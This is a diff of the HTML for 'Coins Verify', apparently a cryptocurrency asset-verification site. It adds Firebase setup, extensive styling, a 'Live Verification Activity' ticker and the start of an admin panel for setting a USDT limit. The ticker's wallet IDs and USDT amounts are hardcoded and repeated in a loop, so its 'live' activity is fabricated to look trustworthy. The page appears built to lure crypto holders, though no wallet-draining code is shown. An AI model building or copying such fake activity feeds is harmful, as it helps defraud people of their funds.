@@ -4,13 +4,49 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
     <title>Coins Verify - Secure Asset Verification</title>
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cdefs%3E%3ClinearGradient id='grad' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%23ffc107;stop-opacity:1' /%3E%3Cstop offset='100%25' style='stop-color:%23ffd700;stop-opacity:1' /%3E%3C/linearGradient%3E%3C/defs%3E%3Crect x='6' y='6' width='20' height='20' rx='4' fill='url(%23grad)' transform='rotate(45 16 16)'/%3E%3Crect x='10' y='10' width='12' height='12' rx='2' fill='%23000' transform='rotate(45 16 16)'/%3E%3Crect x='12' y='12' width='8' height='8' rx='1' fill='url(%23grad)' transform='rotate(45 16 16)'/%3E%3C/svg%3E">
+    
+    <!-- GSAP CDN -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+        import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDxU6sANXMBszDVFzzi_ROLZrIwtCQKmJI",
+            authDomain: "coins-verify.firebaseapp.com",
+            projectId: "coins-verify",
+            storageBucket: "coins-verify.firebasestorage.app",
+            messagingSenderId: "616556252905",
+            appId: "1:616556252905:web:b62d9df9741ef80b7e2a78"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Make Firebase functions globally available
+        window.firebaseDB = db;
+        window.firebaseDoc = doc;
+        window.firebaseGetDoc = getDoc;
+        window.firebaseSetDoc = setDoc;
+    </script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+        }
+
+        html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
         }
 
         body {
@@ -19,6 +55,9 @@
             color: #fff;
             line-height: 1.6;
             overflow-x: hidden;
+            margin: 0;
+            padding: 0;
+            width: 100%;
         }
 
         /* Hero */
@@ -41,46 +80,6 @@
             pointer-events: none;
         }
 
-        .logo-container {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 2rem;
-            position: relative;
-            z-index: 2;
-        }
-
-        .bnb-logo {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #ffc107, #ffd700);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 1rem;
-            position: relative;
-            transform: rotate(45deg);
-        }
-
-        .bnb-logo::before {
-            content: '';
-            width: 30px;
-            height: 30px;
-            background: #000;
-            border-radius: 6px;
-            transform: rotate(-45deg);
-        }
-
-        .bnb-logo::after {
-            content: '';
-            position: absolute;
-            width: 20px;
-            height: 20px;
-            background: linear-gradient(135deg, #ffc107, #ffd700);
-            border-radius: 4px;
-            transform: rotate(-45deg);
-        }
 
         header h1 {
             font-size: 2.5rem;
@@ -96,13 +95,67 @@
             margin-top: 0.5rem;
         }
 
+        /* Hero Section */
+        .hero {
+            width: 100%;
+            padding: 60px 20px;
+            margin-top: 100px;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+
+        .hero h2 {
+            font-size: 48px;
+            color: #ffc107;
+            margin: 0 0 20px 0;
+            font-weight: 700;
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: #ccc;
+            margin: 0 auto 40px auto;
+            max-width: 800px;
+            line-height: 1.6;
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 80px;
+            margin-top: 40px;
+            flex-wrap: wrap;
+        }
+
+        .hero-stat {
+            text-align: center;
+        }
+
+        .hero-stat .stat-number {
+            font-size: 48px;
+            font-weight: 800;
+            color: #ffc107;
+            margin-bottom: 10px;
+            line-height: 1;
+        }
+
+        .hero-stat .stat-label {
+            font-size: 14px;
+            color: #ccc;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
         /* Network Stats Section */
         .network-stats {
-            background: #1a1a1a;
-            margin: 2rem 1rem;
-            border-radius: 16px;
-            padding: 1.5rem;
-            border: 1px solid #333;
+            margin: 0;
+            width: 100%;
+            box-sizing: border-box;
+            border-radius: 0;
+            padding: 40px 20px;
+            border: none;
+            border-bottom: 1px solid #333;
             position: relative;
         }
 
@@ -146,6 +199,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 1rem;
+            width: 100%;
         }
 
         .stat-card {
@@ -157,6 +211,13 @@
             font-weight: 700;
             box-shadow: 0 4px 15px rgba(255, 193, 7, 0.2);
             transition: transform 0.3s ease;
+            min-height: 80px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            box-sizing: border-box;
         }
 
         .stat-card:hover {
@@ -216,11 +277,11 @@
         }
 
         .verify-assets-btn {
-            background: linear-gradient(135deg, #ffc107, #ffd700);
+            background: #ffc107;
             color: #000;
             border: none;
             padding: 1.2rem 2rem;
-            border-radius: 12px;
+            border-radius: 0;
             font-size: 1.1rem;
             font-weight: 700;
             text-transform: uppercase;
@@ -233,6 +294,7 @@
             gap: 1rem;
             width: 100%;
             box-shadow: 0 6px 20px rgba(255, 193, 7, 0.3);
+            clip-path: polygon(0 0, calc(100% - 20px) 0, 100% 100%, 0 100%);
         }
 
         .verify-assets-btn:hover {
@@ -240,80 +302,48 @@
             box-shadow: 0 8px 25px rgba(255, 193, 7, 0.4);
         }
 
+        .verify-assets-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .button-loader {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #000;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 0.5rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         .shield-icon {
             width: 20px;
             height: 20px;
-            background: #000;
-            border-radius: 4px;
+            background: transparent;
             position: relative;
         }
 
         .shield-icon::before {
-            content: '🛡️';
+            content: '';
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 12px;
+            width: 100%;
+            height: 100%;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none'%3E%3Cpath d='M12 2L4 5V11C4 16.55 7.84 21.74 12 23C16.16 21.74 20 16.55 20 11V5L12 2Z' stroke='%23000000' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
         }
 
-        .hexagon-graphic {
-            display: flex;
-            justify-content: center;
-            margin-top: 2rem;
-        }
-
-        .hexagon-container {
-            position: relative;
-            width: 120px;
-            height: 120px;
-        }
-
-        .hexagon-outer {
-            width: 100px;
-            height: 100px;
-            background: linear-gradient(135deg, #ffc107, #ffd700);
-            border-radius: 20px;
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            transform: rotate(45deg);
-        }
-
-        .hexagon-inner {
-            width: 60px;
-            height: 60px;
-            background: #000;
-            border-radius: 12px;
-            position: absolute;
-            top: 30px;
-            left: 30px;
-            transform: rotate(45deg);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .bnb-diamond {
-            width: 20px;
-            height: 20px;
-            background: linear-gradient(135deg, #ffc107, #ffd700);
-            border-radius: 4px;
-            transform: rotate(-45deg);
-        }
-
-        .hexagon-dots {
-            position: absolute;
-            width: 8px;
-            height: 8px;
-            background: #ffc107;
-            border-radius: 50%;
-        }
-
-        .dot-1 { top: 0; left: 50%; transform: translateX(-50%); }
-        .dot-2 { top: 50%; right: 0; transform: translateY(-50%); }
-        .dot-3 { bottom: 0; left: 50%; transform: translateX(-50%); }
-        .dot-4 { top: 50%; left: 0; transform: translateY(-50%); }
 
         /* Top Verification Strip */
         .verification-strip {
@@ -323,32 +353,118 @@
             right: 0;
             background: #1a1a1a;
             border-bottom: 1px solid #ffc107;
-            padding: 0.5rem 1rem;
+            padding: 0.5rem 0;
             z-index: 10000;
             overflow: hidden;
-            height: 40px;
+            height: 50px;
         }
 
-        .verification-content {
+        .verification-marquee {
+            display: flex;
+            align-items: center;
+            height: 100%;
+            white-space: nowrap;
+            gap: 4rem;
+        }
+
+        .verification-item {
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 100%;
+            min-width: 300px;
             color: #ffc107;
             font-weight: 500;
-            font-size: 1rem;
-            white-space: nowrap;
-            height: 100%;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            position: relative;
+            gap: 0.5rem;
         }
 
-        .verification-text {
-            color: #ffc107;
-            font-weight: 500;
-            font-size: 1.2rem;
-            animation: fadeIn 0.6s ease-out;
+
+        /* Verification Marquee Section */
+        .verification-marquee-section {
+            margin: 0;
             width: 100%;
+            box-sizing: border-box;
+            border-radius: 0;
+            padding: 40px 20px;
+            border: none;
+            border-bottom: 1px solid #333;
+        }
+
+        .marquee-title {
+            color: #ffc107;
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
             text-align: center;
         }
+
+        .verification-marquee-container {
+            overflow: hidden;
+            height: 50px;
+            border-radius: 8px;
+            background: #0a0a0a;
+        }
+
+        .verification-marquee {
+            display: flex;
+            align-items: center;
+            height: 100%;
+            white-space: nowrap;
+            gap: 4rem;
+        }
+
+        /* Verify Assets Container */
+        .verify-assets-container {
+            text-align: center;
+            margin: 0;
+            width: 100%;
+            box-sizing: border-box;
+            padding: 3rem 2rem;
+            background: #0a0a0a;
+        }
+
+        .verify-box {
+            border-radius: 16px;
+            padding: 2.5rem;
+            margin: 0 auto 2rem auto;
+            max-width: 800px;
+            border: 1px solid #333;
+            box-shadow: 0 8px 32px rgba(255, 193, 7, 0.1);
+        }
+
+        .verify-box h3 {
+            color: #ffc107;
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            font-weight: 700;
+        }
+
+        .verify-box p {
+            color: #ccc;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 2rem;
+        }
+
+        .feature-highlights {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .highlight {
+            color: #ffc107;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .verify-button-container {
+            margin-top: 1rem;
+        }
+
 
         .counting-animation {
             animation: countUp 1s ease-out;
@@ -378,17 +494,13 @@
             }
         }
 
-        /* Adjust body padding for fixed strip */
-        body {
-            padding-top: 40px;
-        }
 
         nav {
             background: #111;
             padding: 1rem;
             text-align: center;
             position: sticky;
-            top: 40px;
+            top: 0;
             z-index: 9999;
         }
 
@@ -479,54 +591,6 @@
             margin: 1rem 0;
         }
 
-        /* Download Section */
-        .download {
-            text-align: center;
-            margin-top: 2rem;
-        }
-
-        .store-btns {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin-top: 1.5rem;
-        }
-
-        .store-btn {
-            display: flex;
-            align-items: center;
-            gap: 0.7rem;
-            background: #000;
-            color: #fff;
-            border: 2px solid #ffcc00;
-            padding: 0.7rem 1.5rem;
-            border-radius: 10px;
-            text-decoration: none;
-            font-size: 1rem;
-            font-weight: 500;
-            transition: all 0.3s ease;
-        }
-
-        .store-btn:hover {
-            background: #ffcc00;
-            color: #000;
-            border-color: #ffcc00;
-        }
-
-        .store-btn span {
-            display: flex;
-            flex-direction: column;
-            line-height: 1.2;
-        }
-
-        .store-btn small {
-            font-size: 0.75rem;
-        }
-
-        .store-btn strong {
-            font-size: 1.1rem;
-        }
 
         /* Payment Button Styles */
         .payment-section {
@@ -946,16 +1010,6 @@
                 padding: 2rem 1rem 1rem;
             }
             
-            .logo-container {
-                flex-direction: column;
-                gap: 1rem;
-            }
-            
-            .bnb-logo {
-                width: 50px;
-                height: 50px;
-                margin-right: 0;
-            }
             
             header h1 {
                 font-size: 2rem;
@@ -963,20 +1017,34 @@
             }
             
             .network-stats {
-                margin: 1rem;
-                padding: 1rem;
+                margin: 0;
+                padding: 40px 20px;
+                width: 100%;
+            }
+            
+            .network-stats-header {
+                flex-direction: column;
+                gap: 0.5rem;
+                text-align: center;
+                margin-bottom: 1rem;
             }
             
             .stats-grid {
                 gap: 0.8rem;
+                grid-template-columns: 1fr 1fr;
             }
             
             .stat-card {
                 padding: 0.8rem;
+                min-height: 70px;
             }
             
             .stat-number {
                 font-size: 1.5rem;
+            }
+            
+            .stat-label {
+                font-size: 0.7rem;
             }
             
             .verification-section {
@@ -993,24 +1061,71 @@
                 font-size: 1rem;
             }
             
-            .hexagon-container {
-                width: 100px;
-                height: 100px;
+            /* Hero responsive */
+            .hero {
+                min-height: 70vh;
+                padding: 3rem 1rem;
             }
             
-            .hexagon-outer {
-                width: 80px;
-                height: 80px;
-                top: 10px;
-                left: 10px;
+            .hero h2 {
+                font-size: 2.5rem;
             }
             
-            .hexagon-inner {
-                width: 50px;
-                height: 50px;
-                top: 25px;
-                left: 25px;
+            .hero p {
+                font-size: 1.1rem;
             }
+            
+            .hero-stats {
+                gap: 3rem;
+            }
+            
+            .hero-stat {
+                min-width: 120px;
+            }
+            
+            .hero-stat .stat-number {
+                font-size: 2.5rem;
+            }
+            
+            .hero-stat .stat-label {
+                font-size: 0.9rem;
+            }
+            
+            /* Network stats responsive */
+            .network-stats {
+                padding: 40px 20px;
+                margin: 0;
+                width: 100%;
+            }
+            
+            /* Marquee responsive */
+            .verification-marquee-section {
+                padding: 40px 20px;
+                margin: 0;
+                width: 100%;
+            }
+            
+            /* Verify assets container responsive */
+            .verify-assets-container {
+                padding: 2rem 1rem;
+            }
+            
+            /* Verify box responsive */
+            .verify-box {
+                padding: 1.5rem;
+                margin: 0 1rem 2rem 1rem;
+                max-width: none;
+            }
+            
+            .verify-box h3 {
+                font-size: 1.5rem;
+            }
+            
+            .feature-highlights {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
         }
         
         @media (max-width: 1200px) {
@@ -1230,6 +1345,153 @@
                 gap: 1rem;
             }
             
+            /* Mobile marquee adjustments */
+            .verification-item {
+                min-width: 250px;
+                font-size: 1rem;
+            }
+            
+            .verification-marquee {
+                gap: 2rem;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .verification-strip {
+                height: 45px;
+            }
+            
+            .verification-item {
+                min-width: 280px;
+                font-size: 1rem;
+            }
+            
+            .verification-marquee {
+                gap: 3rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .verification-strip {
+                height: 40px;
+            }
+            
+            .verification-item {
+                min-width: 200px;
+                font-size: 0.9rem;
+            }
+            
+            .verification-marquee {
+                gap: 1.5rem;
+            }
+            
+            /* Network Stats for small mobile */
+            .network-stats {
+                margin: 0;
+                padding: 40px 20px;
+                width: 100%;
+            }
+            
+            .network-stats-header {
+                margin-bottom: 0.8rem;
+            }
+            
+            .network-stats-title {
+                font-size: 0.9rem;
+            }
+            
+            .live-indicator {
+                font-size: 0.8rem;
+            }
+            
+            .stats-grid {
+                gap: 0.5rem;
+                grid-template-columns: 1fr 1fr;
+            }
+            
+            .stat-card {
+                padding: 0.6rem;
+                min-height: 60px;
+                border-radius: 8px;
+            }
+            
+            .stat-number {
+                font-size: 1.2rem;
+                margin-bottom: 0.2rem;
+            }
+            
+            .stat-label {
+                font-size: 0.65rem;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            /* Extra small mobile devices */
+            .network-stats {
+                margin: 0;
+                padding: 40px 20px;
+                width: 100%;
+            }
+            
+            .stats-grid {
+                gap: 0.4rem;
+            }
+            
+            .stat-card {
+                padding: 0.5rem;
+                min-height: 55px;
+                border-radius: 6px;
+            }
+            
+            .stat-number {
+                font-size: 1.1rem;
+            }
+            
+            .stat-label {
+                font-size: 0.6rem;
+            }
+            
+            .network-stats-title {
+                font-size: 0.8rem;
+            }
+            
+            .live-indicator {
+                font-size: 0.7rem;
+            }
+            
+            /* Hero section for small mobile */
+            .hero {
+                min-height: 60vh;
+                padding: 2rem 0.5rem;
+            }
+            
+            .hero h2 {
+                font-size: 2rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            .hero-stats {
+                gap: 2rem;
+                flex-direction: column;
+            }
+            
+            .hero-stat {
+                min-width: auto;
+            }
+            
+            .hero-stat .stat-number {
+                font-size: 2rem;
+            }
+            
+            .hero-stat .stat-label {
+                font-size: 0.8rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
             #stats .container > div > div > div:first-child {
                 font-size: 1.8rem;
             }
@@ -1286,34 +1548,336 @@
                 width: 100%;
             }
         }
+
+        /* Admin Panel Styles */
+        .admin-access-btn {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            background: #ffcc00;
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .admin-access-btn:hover {
+            background: #ffa000;
+            transform: scale(1.1);
+        }
+
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .admin-container {
+            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
+            border-radius: 20px;
+            max-width: 800px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+            margin: 0 auto;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 2rem;
+            border-bottom: 1px solid #333;
+        }
+
+        .admin-header h2 {
+            color: #ffcc00;
+            margin: 0;
+            font-size: 1.8rem;
+        }
+
+        .close-admin-btn {
+            background: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            font-size: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .close-admin-btn:hover {
+            background: #cc3333;
+            transform: scale(1.1);
+        }
+
+        .admin-content {
+            padding: 2rem;
+        }
+
+        .admin-section {
+            margin-bottom: 2rem;
+            padding: 1.5rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 204, 0, 0.2);
+        }
+
+        .admin-section h3 {
+            color: #ffcc00;
+            margin: 0 0 1rem 0;
+            font-size: 1.3rem;
+        }
+
+        .input-group {
+            margin-bottom: 1rem;
+        }
+
+        .input-group label {
+            display: block;
+            color: #ddd;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+
+        .input-with-unit {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .input-group input {
+            flex: 1;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1rem;
+            min-width: 400px;
+            width: 100%;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.2);
+        }
+
+        .input-group input[type="password"] {
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+        }
+
+        .password-input-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .password-input-container input {
+            flex: 1;
+            margin: 0;
+        }
+
+        .toggle-password {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: #fff;
+            padding: 12px 16px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            min-width: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-password:hover {
+            background: rgba(255, 204, 0, 0.2);
+            border-color: #ffcc00;
+        }
+
+        .toggle-password:active {
+            transform: scale(0.95);
+        }
+
+        .unit {
+            color: #ffcc00;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+
+        .admin-btn {
+            background: linear-gradient(135deg, #ffcc00, #ffa000);
+            color: #000;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .admin-btn:hover {
+            background: linear-gradient(135deg, #ffa000, #ff8800);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3);
+        }
+
+        .settings-display {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 1rem;
+            border-radius: 8px;
+        }
+
+        .setting-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .setting-item:last-child {
+            border-bottom: none;
+        }
+
+        .setting-label {
+            color: #ddd;
+            font-weight: 500;
+        }
+
+        .setting-value {
+            color: #ffcc00;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            word-break: break-all;
+        }
+
+        /* Responsive Admin Panel */
+        @media (max-width: 768px) {
+            .admin-container {
+                margin: 10px;
+                max-height: 90vh;
+            }
+
+            .admin-header {
+                padding: 1.5rem;
+            }
+
+            .admin-header h2 {
+                font-size: 1.5rem;
+            }
+
+            .admin-content {
+                padding: 1.5rem;
+            }
+
+            .admin-section {
+                padding: 1rem;
+            }
+
+            .input-with-unit {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .input-group input {
+                min-width: auto;
+            }
+
+            .password-input-container {
+                gap: 8px;
+            }
+
+            .toggle-password {
+                min-width: 45px;
+                padding: 10px 12px;
+                font-size: 14px;
+            }
+
+            .unit {
+                align-self: flex-start;
+                margin-top: 0.5rem;
+            }
+
+            .setting-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+
+            .setting-value {
+                word-break: break-all;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .admin-access-btn {
+                top: 70px;
+                right: 10px;
+                width: 45px;
+                height: 45px;
+                font-size: 18px;
+            }
+
+            .admin-header {
+                padding: 1rem;
+            }
+
+            .admin-content {
+                padding: 1rem;
+            }
+
+            .admin-section {
+                padding: 0.8rem;
+            }
+
+            .password-input-container {
+                gap: 6px;
+            }
+
+            .toggle-password {
+                min-width: 40px;
+                padding: 8px 10px;
+                font-size: 12px;
+            }
+        }
     </style>
 </head>
 
 <body>
-    <!-- Top Verification Strip -->
-    <div class="verification-strip" id="verificationStrip">
-        <div class="verification-content" id="verificationContent">
-            <div class="verification-text" id="verificationText">
-                <span class="counting-animation">f092**05caed</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">6,529 USDT</span>
-            </div>
-        </div>
-    </div>
 
     <nav>
         <a href="#about">About</a>
         <a href="#features">Features</a>
         <a href="#how">How It Works</a>
-        <a href="#download">Download</a>
         <a href="#contact">Contact</a>
     </nav>
-
-    <header>
-        <div class="logo-container">
-            <div class="bnb-logo"></div>
-            <h1>COINS VERIFY</h1>
-        </div>
-        <p>Secure Asset Verification Platform</p>
-    </header>
 
     <!-- Network Stats Section -->
     <div class="network-stats">
@@ -1344,6 +1908,223 @@
         </div>
     </div>
 
+    <!-- Verification Marquee -->
+    <div class="verification-marquee-section">
+        <div class="marquee-title">Live Verification Activity</div>
+        <div class="verification-marquee-container">
+            <div class="verification-marquee" id="verificationMarquee">
+                <div class="verification-item">
+                    <span class="counting-animation">04a**d9b39e</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">15,513 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">f092**05caed</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">6,529 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">b3c8**9f2a1d</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">23,847 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">7e1a**c4f8b9</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">12,356 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">d5f2**a7e3c1</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">8,934 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">9b8c**6e4f2a</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">45,678 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">c7f3**a8b2e5</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">32,156 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">e9d4**7f1c8a</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">18,942 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">a6b8**5c3f9d</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">27,834 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">f2e7**9a4b6c</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">14,567 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">d8c1**3f7e9a</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">39,285 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">b5a9**8e2c4f</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">21,673 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">e3f6**c1a8b5</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">36,419 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">8f2c**4e9a7b</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">29,847 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">b7e5**a3f8c2</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">16,234 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">d4a9**6c1e8f</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">41,567 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">f8b3**2e7c9a</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">24,891 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">a1c6**9f4e7b</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">33,742 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">e5d8**c2a6f1</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">19,456 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">c9f4**8b3e7a</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">37,823 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">b2e7**5f9c4a</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">26,158 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">f6a3**1c8e9b</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">31,694 USDT</span>
+                </div>
+                <!-- Duplicate items for seamless loop -->
+                <div class="verification-item">
+                    <span class="counting-animation">04a**d9b39e</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">15,513 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">f092**05caed</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">6,529 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">b3c8**9f2a1d</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">23,847 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">7e1a**c4f8b9</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">12,356 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">d5f2**a7e3c1</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">8,934 USDT</span>
+                </div>
+                <div class="verification-item">
+                    <span class="counting-animation">9b8c**6e4f2a</span> <span style="color: #4CAF50;">VERIFIED</span> <span class="counting-animation">45,678 USDT</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Panel -->
+    <section id="adminPanel" class="admin-panel" style="display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.8); z-index: 2000; align-items: center; justify-content: center;">
+        <div class="admin-container">
+            <div class="admin-box">
+                <div class="admin-header">
+                    <h2>🔧 Admin Panel</h2>
+                    <button id="closeAdminBtn" class="close-admin-btn">×</button>
+                </div>
+                
+                <div class="admin-content">
+                    <div class="admin-section">
+                        <h3>USDT Limit Settings</h3>
+                        <div class="input-group">
+                            <label for="adminUsdtLimit">Current Limit:</label>
+                            <div class="input-with-unit">
+                                <input type="number" id="adminUsdtLimit" placeholder="Enter USDT limit">
+                                <span class="unit">USDT</span>
+                            </div>
